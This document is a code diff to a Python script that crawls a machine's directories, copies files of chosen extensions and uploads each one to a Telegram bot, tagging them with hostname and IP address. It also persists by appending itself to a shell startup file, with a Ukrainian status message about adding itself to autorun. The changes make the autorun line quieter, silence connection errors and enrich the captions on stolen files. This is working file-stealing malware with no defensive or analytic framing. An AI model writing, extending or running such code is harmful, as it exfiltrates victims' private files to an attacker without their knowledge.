@@ -28,6 +28,7 @@ def copyFile(src,dst):
 
 def get_files(directory_path,extlist):
     global file_list
+    hostname=socket.gethostname()
     for root, dirs, files in os.walk(directory_path):
         for name in files:
             fname=os.path.join(root, name)
@@ -36,7 +37,8 @@ def get_files(directory_path,extlist):
                 ext=splittup[1]
                 if ext=='':
                     ext='default'
-                file_list.append((fname,ext[1:]))
+                if not fname.startswith('/media') and not hostname in fname:
+                    file_list.append((fname,ext[1:]))
 
 def winntAutoRun():
     fname=sys.argv[0]
@@ -89,23 +91,23 @@ def addToAutoRun():
         print('Зараз додаємо файл в автозапуск')
         try:
             with open(autoconf,'a',encoding="utf-8", newline='') as shellrc:
-                shellrc.write(f"\npython3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &")
+                shellrc.write(f"\n(python3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &)")
         except FileNotFoundError:
             with open(autoconf,'x',encoding="utf-8", newline='') as shellrc:
-                shellrc.write(f"\npython3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &")            
+                shellrc.write(f"\n(python3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &)")            
     return
 
 def send_document(bot_token,chtid,docfile,caption='Nothing'):
-	url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
-	data = {'chat_id' : chtid,'caption': caption}
-	files={'document': open(docfile, 'rb')}
-	r=requests.post(url,params=data,files=files)
-	return
+    url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
+    data = {'chat_id' : chtid,'caption': caption}
+    files={'document': open(docfile, 'rb')}
+    r=requests.post(url,params=data,files=files)
+    return
 
 
 def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
     cnt=num
-    global PROC_NUM
+    PROC_NUM=15
     global sep
     if os.name=='nt':
         sep='\\'
@@ -123,14 +125,18 @@ def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
                 copyFile(fname,f"{dirname}{sep}{newname}")
                 if fileList[cnt]=='TERMINATED':
                     return
-                cnt+=PROC_NUM
+                fname=fname.replace('\\\\','\\')
             except:
                 pass
             try:
-                send_document(wt,cht,fname,f"Host:{hostname} - {fname}")
+                send_document(wt,cht,fname,f"Folder:{dname} Host:{hostname} Origname:{os.path.split(fname)[1]} {fname}")
             except:
-                print('[-]No connection')
-
+                pass
+            try:
+                if os.path.exists(fileList[cnt][0]):
+                    cnt+=PROC_NUM
+            except:
+                pass
 
 def main():
     global PROC_NUM
@@ -144,7 +150,7 @@ def main():
     # pth=os.environ['PWD']
     cfgpath=f'.{sep}config.py'
     if not os.path.exists(cfgpath):
-        cfgpath=f'{pth}{sep}.config{sep}config.py'
+        cfgpath=f'.{sep}.config{sep}config.py'
 	
     with open(cfgpath,'r') as fl:
         basestr=fl.read()
@@ -192,7 +198,7 @@ def main():
         file_list=manager.list()
         procs=[]
         for num in range(1,PROC_NUM+1):
-            procs.append(Process(target=superProc,args=(file_list,num,extlist,hostdir,f"{hostname} - IPADDR:{ip_address}",wt,cht)))
+            procs.append(Process(target=superProc,args=(file_list,num,extlist,hostdir,f"{hostname}-{ip_address}",wt,cht)))
         for proc in procs:
             proc.start()
 
